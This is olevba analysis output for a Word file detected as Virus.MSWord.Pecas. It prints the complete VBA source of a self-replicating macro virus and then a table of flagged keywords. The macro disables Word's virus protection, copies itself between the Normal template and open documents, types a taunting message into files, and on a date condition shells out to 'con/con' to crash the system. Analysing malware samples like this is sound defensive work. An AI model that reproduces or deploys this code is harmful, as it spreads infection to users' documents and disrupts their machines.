olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Pecas-de9f0e019f6b0a570afdc7a8f1c415fae8c87dfb
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Pecas.cls 
in file: Virus.MSWord.Pecas-de9f0e019f6b0a570afdc7a8f1c415fae8c87dfb - OLE stream: 'Macros/VBA/Pecas'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'morris
Private Sub Document_Close()
On Error Resume Next
Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1)
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
pos = 3
x = "Private Sub Document_Open()"
paso2 = False
pasada:
cont = nt.CodeModule.CountOfLines
coad = ad.CodeModule.CountOfLines
If nt.CodeModule.lines(1, 1) <> "'morris" Then
nt.CodeModule.DeleteLines 1, cont
 If nt.Name <> "Pecas" Then
   nt.Name = "Pecas"
 End If
nt.CodeModule.AddFromString ("'morris")
 If paso2 = False Then
  nt.CodeModule.AddFromString ("Private Sub Document_Close()")
  nt.CodeModule.InsertLines pos, ad.CodeModule.lines(pos, coad)
 Else
  nt.CodeModule.AddFromString (x)
  nt.CodeModule.InsertLines pos, ad.CodeModule.lines(pos, coad)
   If InStr(1, ActiveDocument.Name, "Document") = False Then
    Selection.TypeText "Game´s over. morris Win......."
    ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
   Else
    ActiveDocument.Saved = True
   End If
 End If
End If
If paso2 = True Then
  If Day(Now) = Minute(Now) Then
   ser$ = Shell("con/con", vbNormalFocus)
  End If
Exit Sub
Else
 paso2 = True
 Set ad = NormalTemplate.VBProject.VBComponents.Item(1)
 Set nt = ActiveDocument.VBProject.VBComponents.Item(1)
 GoTo pasada
End If
End Sub
'Made in Mexico by morris , te Amo Pecas IDyahoo m0rr1z







+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbNormalFocus       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

